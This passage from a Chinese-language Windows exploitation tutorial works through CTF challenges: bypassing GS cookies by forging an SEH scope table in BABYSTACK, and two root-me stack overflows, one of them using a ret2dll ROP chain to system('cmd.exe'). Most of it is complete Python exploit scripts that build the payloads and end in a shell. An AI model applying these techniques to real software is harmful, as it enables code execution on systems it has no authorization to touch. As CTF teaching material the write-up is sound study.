                EH4 Stack                     |  EHCookieOffset   |
          +-------------------+               +-------------------+
High      |      ......       |               | EHCookieXorOffset |
          +-------------------+               +-------------------+
ebp       |        ebp        |   +-----------&gt;  EncloseingLevel  &lt;--+-&gt; 0xFFFFFFFE
          +-------------------+   | Level 0   +-------------------+  |
ebp - 04h |     TryLevel      +---+           |     FilterFunc    |  |
          +-------------------+   |           +-------------------+  |
ebp - 08h |    Scope Table    |   |           |    HandlerFunc    |  |
          +-------------------+   |           +-------------------+  |
ebp - 0Ch | ExceptionHandler  |   +-----------&gt;  EncloseingLevel  +--+-&gt; 0x00000000
          +-------------------+     Level 1   +-------------------+
ebp - 10h |       Next        |               |     FilterFunc    |
          +-------------------+               +-------------------+
ebp - 14h | ExceptionPointers +----+          |    HandlerFunc    |
          +-------------------+    |          +-------------------+
ebp - 18h |        esp        |    |
          +-------------------+    |            ExceptionPointers
Low       |      ......       |    |          +-------------------+
          +-------------------+    +----------&gt;  ExceptionRecord  |
                                              +-------------------+
                                              |   ContextRecord   |
                                              +-------------------+
```

在处理程序的一开始我们可以看到，为了要伪造`FilterFunc`，我们需要知道`CookiePointer`的值，这个值储存在`__security_cookie`的内存处，且与程序加载位置偏移固定，于是可以直接通过`main`函数地址的位置进行计算获得！

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-08-095341.png)

事实上，接下来其实还有个问题，在异常处理中可以看到有`ValidateLocalCookies(CookieCheckFunction, ScopeTable, &amp;EstablisherFrame + 16);`我们来看看此处的实现：

```
void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)
`{`
    unsigned int v3; // esi@2
    unsigned int v4; // esi@3

    if ( scopeTable-&gt;GSCookieOffset != -2 )
    `{`
        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];
        __guard_check_icall_fptr(cookieCheckFunction);
        ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v3);
    `}`
    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];
    __guard_check_icall_fptr(cookieCheckFunction);
    ((void (__thiscall *)(_DWORD))cookieCheckFunction)(v4);
`}`
```

这里事实上就是检查要求`*(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset]`的值必须为`__security_cookie`，以及`*(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset]`的值必须为`__security_cookie`。

从上图的结构图可以看出我们事实上可以劫持`scopeTable`的地址！那么我们可以让`scopeTable-&gt;GSCookieOffset`的值为`-2`，这样程序将不会继续检查`*(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (unsigned int)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];`。

那么我们可以构造`Payload`:

```
payload  = 'a' * 0x10
payload += p32(0x0FFFFFFFE)                               # scopeTable -&gt; GSCookieOffset
payload += p32(0)
payload += p32(0x0FFFFFFCC)                               # scopeTable -&gt; EHCookieOffset
payload += p32(0)
payload  = payload.ljust(0x70, 'b')
payload += p32(GS_Cookie)                      # framePointer[scopeTable-&gt;EHCookieOffset]
payload += 'c' * 0x20
payload += p32(stack_address + 0xD4)
payload += p32(PIE_address + 0x1460)
payload += p32((stack_address + 0x10) ^ security_cookie)   # scopeTable
payload += p32(0)
payload += 'd' * 0x10                                      # framePointer
```

[![](https://img.lhyerror404.cn/error404/2020-07-09-023101.png)](https://img.lhyerror404.cn/error404/2020-07-09-023101.png)

[![](https://img.lhyerror404.cn/error404/2020-07-09-023215.png)](https://img.lhyerror404.cn/error404/2020-07-09-023215.png)

[![](https://img.lhyerror404.cn/error404/2020-07-09-024134.png)](https://img.lhyerror404.cn/error404/2020-07-09-024134.png)

可以发现，该检查已经通过！

[![](https://img.lhyerror404.cn/error404/2020-07-09-024303.png)](https://img.lhyerror404.cn/error404/2020-07-09-024303.png)

#### <a class="reference-link" name="%E6%9C%80%E7%BB%88%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81%E5%88%B0Shell"></a>最终劫持控制流到Shell

接下来我们只需要伪造`FilterFunc`到程序后门即可完成利用。

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from winpwn import *
import os
import traceback
import sys
context.log_level='debug'
# context.arch='amd64'
context.arch='i386'

# file_name=ELF('./file_name', checksec = False)

def get_sh():
    if len(sys.argv) &gt; 1 and sys.argv[1] == 'REMOTE' :
        return remote(sys.argv[2],sys.argv[3])
    else:
        return process("./BABYSTACK.exe")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string).strip(end_string),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].strip(end_string).ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        print(info + str(hex(return_address)))
    return return_address

# def get_flag(sh):
#     sh.sendline('cat /flag')
#     return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    windbgx.attach(sh)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        stack_address = get_address(sh=sh,info="[+] STACK ADDRESS IS ",start_string="stack address = 0x",end_string="x0A",int_mode=True)
        PIE_address   = get_address(sh=sh,info="[+] PIE ADDRESS IS ",start_string="main address = 0x",end_string="x0A",offset=-0x10B0,int_mode=True)
        sh.recvuntil('Do you want to know more?')
        sh.sendline('yes')
        sh.recvuntil('Where do you want to know')
        sh.sendline(str(PIE_address + 0x4004))

        security_cookie = get_address(sh=sh,info="[+] Security Cookie IS ",start_string=" value is 0x",end_string="x0A",int_mode=True)
        GS_Cookie = (stack_address + 0x9C) ^ security_cookie

        payload  = 'a' * 0x10
        payload += p32(0x0FFFFFFFE)
        payload += p32(0)
        payload += p32(0x0FFFFFFCC)
        payload += p32(0)
        payload += p32(0xFFFFFFFE)
        payload += p32(PIE_address + 0x138D)
        payload  = payload.ljust(0x78 - 0x10, 'b')
        payload += p32(GS_Cookie)
        payload += 'c' * 0x20
        payload += p32(stack_address + 0xD4)
        payload += p32(PIE_address + 0x1460)
        payload += p32((stack_address + 0x10) ^ security_cookie)
        payload += p32(0)
        payload += 'd' * 0x10
        sh.recvuntil('Do you want to know more?')
        # get_gdb(sh)
        sh.sendline('noo')
        sh.sendline(payload)
        sh.recvuntil('Do you want to know more?')
        sh.sendline('yes')
        sh.recvuntil('Where do you want to know')
        sh.sendline('0')
        sh.interactive()
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    os.system("")
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```



## 0x05 以[root-me]PE32 – Stack buffer overflow basic为例

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"></a>程序保护检查

[![](https://img.lhyerror404.cn/error404/2020-07-09-094628.png)](https://img.lhyerror404.cn/error404/2020-07-09-094628.png)

发现基本是无保护程序

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>程序漏洞分析

存在一个明显的栈溢出

[![](https://img.lhyerror404.cn/error404/2020-07-09-095424.png)](https://img.lhyerror404.cn/error404/2020-07-09-095424.png)

存在后门函数

[![](https://img.lhyerror404.cn/error404/2020-07-09-095617.png)](https://img.lhyerror404.cn/error404/2020-07-09-095617.png)

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>程序漏洞利用

直接利用常规的栈溢出思路，覆盖返回地址以及`EBP`

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from winpwn import *
import os
import traceback
import sys
context.log_level='debug'
# context.arch='amd64'
context.arch='i386'

# file_name=ELF('./file_name', checksec = False)

def get_sh():
    if len(sys.argv) &gt; 1 and sys.argv[1] == 'REMOTE' :
        return remote(sys.argv[2],sys.argv[3])
    else:
        return process("./ch72.exe")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string).strip(end_string),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].strip(end_string).ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        print(info + str(hex(return_address)))
    return return_address

# def get_flag(sh):
#     sh.sendline('cat /flag')
#     return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    windbgx.attach(sh)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        payload  = 'a' * 0x14 + p32(0xDEADBEEF)
        payload += p32(0x401000)
        # get_gdb(sh)
        sh.sendline(payload)
        sh.interactive()
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    os.system("")
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```



## 0x06 以[root-me]Advanced stack buffer overflow为例

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"></a>程序保护检查

[![](https://img.lhyerror404.cn/error404/2020-07-09-121919.png)](https://img.lhyerror404.cn/error404/2020-07-09-121919.png)

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>程序漏洞分析

[![](https://img.lhyerror404.cn/error404/2020-07-10-090321.png)](https://img.lhyerror404.cn/error404/2020-07-10-090321.png)

这个题需要我们在运行时提交一个文件作为餐数，然后会读取其中的内容作为`manage_file`函数的参数传入

然后程序就会将文件的内容读取到局部变量中

[![](https://img.lhyerror404.cn/error404/2020-07-10-090652.png)](https://img.lhyerror404.cn/error404/2020-07-10-090652.png)

但是显然这里没有做很好的长度过滤，这会导致栈溢出的发生。

这一次程序中不再有后门函数以供我们利用，于是我们这次使用`ret2dll`完成利用。

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>程序漏洞利用

**由于程序没有开启`PIE`保护，系统也没有开启`aslr`于是可以不用考虑`Leak`相关地址后程序崩溃的问题，因为相关地址并不会发生任何的改变。**

#### <a class="reference-link" name="%E6%B3%84%E9%9C%B2%E5%90%88%E6%B3%95%E6%96%87%E4%BB%B6%E5%9C%B0%E5%9D%80"></a>泄露合法文件地址

由于我们触发栈溢出后必然会影响`fclose`的参数，于是我们先行泄露：

```
payload  = p32(0) * 100
open('./payload_0','w').write(payload)
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-061206.png)

#### <a class="reference-link" name="%E6%B3%84%E9%9C%B2DLL%E5%8A%A0%E8%BD%BD%E5%9C%B0%E5%9D%80"></a>泄露DLL加载地址

我们可以利用`printf`函数来泄露并计算`DLL`文件的加载基址。

```
payload  = p32(0x76284660) * (0x2014 / 4) + p32(0xDEADBEEF) 
payload += p32(0x00402974) # printf@plt
payload += p32(0x004016E3) # _manage_file
payload += p32(0x00406200) # printf@got
open('./payload_1','w').write(payload)
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-061416.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-061511.png)

又可以从`IDA`中看出`DLL`文件位于`msvcrt.dll`，文件位于`C:WindowsSystemSysWOW64`目录下。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-061718.png)

于是可以计算出`DLL`加载地址

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-044542.png)

#### <a class="reference-link" name="%E6%9C%80%E7%BB%88%E5%AE%8C%E6%88%90%E5%88%A9%E7%94%A8"></a>最终完成利用

最终我们直接计算构造ROP即可

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-044731.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-07-11-044856.png)

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from winpwn import *
import os
import traceback
import sys
context.log_level='debug'
# context.arch='amd64'
context.arch='i386'

# file_name=ELF('./file_name', checksec = False)

def get_sh():
    if len(sys.argv) &gt; 1 and sys.argv[1] == 'REMOTE' :
        return remote(sys.argv[2],sys.argv[3])
    else:
        return process("./ch73.exe")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string).strip(end_string),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].strip(end_string).ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        print(info + str(hex(return_address)))
    return return_address

# def get_flag(sh):
#     sh.sendline('cat /flag')
#     return sh.recvrepeat(0.3)

def get_gdb(sh,stop=False):
    windbgx.attach(sh)
    if stop :
        raw_input()

def Attack():
    try:
        # Your Code here
        payload  = p32(0) * 100
        open('./payload_0','w').write(payload)

        payload  = p32(0x76284660) * (0x2014 / 4) + p32(0xDEADBEEF) 
        payload += p32(0x00402974) # printf@plt
        payload += p32(0x004016E3) # _manage_file
        payload += p32(0x00406200) # printf@got
        open('./payload_1','w').write(payload)

        payload  = p32(0x76284660) * (0x2014 / 4) + p32(0xDEADBEEF) 
        payload += p32(0x76213DC0) # system
        payload += p32(0x004016E3) # _manage_file
        payload += p32(0x761D47A4) # cmd.exe
        open('./payload_2','w').write(payload)
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    os.system("")
    Attack()
```

[![](https://img.lhyerror404.cn/error404/2020-07-11-102405.png)](https://img.lhyerror404.cn/error404/2020-07-11-102405.png)



## 0x07 参考链接

[【原】超酷的 PowerShell 美化指南 – Lulus](https://zhuanlan.zhihu.com/p/51901035)

[【原】CFG防护机制的简要分析 – f0******](https://xz.aliyun.com/t/2587)

[【原】Windows-pwn解题原理&amp;利用手法详解 – 萝卜](https://www.anquanke.com/post/id/188170)

[【原】HITB GSEC BABYSTACK — win pwn 初探 – Ex](http://blog.eonew.cn/archives/1182)

[【原】Windows PE 第四章 导入表 – TK13](https://blog.csdn.net/u013761036/article/details/52751849)
